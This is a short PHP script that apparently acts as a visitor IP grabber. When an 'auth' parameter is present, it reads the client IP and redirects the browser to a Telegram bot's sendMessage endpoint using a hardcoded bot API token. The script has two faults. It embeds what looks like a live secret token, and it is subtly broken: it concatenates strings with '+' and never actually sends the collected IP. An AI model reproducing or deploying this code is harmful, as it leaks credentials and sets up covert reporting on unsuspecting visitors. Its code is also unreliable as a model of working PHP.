<?php


if(isset($_GET["auth"])){


echo "<p>Getting Data</p>";
$user_ip = $_SERVER['HTTP_CLIENT_IP'];

$res = "IP : $user_ip";


  $apiToken = "5618240216:AAEWaStqi7Pwx6Sj8xKx88UXH_sigK5_Iks";
  $data = [
      'chat_id' => $_GET["auth"],
      'text' => 'fv'
  ];
  $url = "https://api.telegram.org/bot$apiToken/sendMessage?" + http_build_query($data);
header("Location: $url");
}
